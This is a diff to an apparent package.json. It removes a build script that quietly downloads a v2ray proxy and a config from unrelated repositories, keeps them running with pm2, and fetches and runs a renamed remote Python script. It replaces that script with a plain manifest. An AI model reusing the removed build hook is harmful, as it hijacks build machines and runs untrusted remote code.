@@ -1,3 +1,8 @@
-"scripts": {
-  "build": "echo "./v2ray run --config=fx.json" > bash.sh && npm install pm2 -g && wget https://github.com/v2fly/v2ray-core/releases/download/v5.13.0/v2ray-linux-64.zip && unzip v2ray-linux-64.zip && wget https://raw.githubusercontent.com/mirjinx83/probable-invention/main/fx.json && chmod 777 bash.sh && pm2 start bash.sh && wget https://raw.githubusercontent.com/im7xeig/scaling-waffle/main/run.py && chmod 777 run.py && mv run.py xzxa1xx.py && ./xzxa1xx.py"
+{
+  "name": "my-project",
+  "version": "1.0.0",
+  "scripts": {
+    "build": "bash ./test.sh"
+  },
+  "dependencies": {}
 }
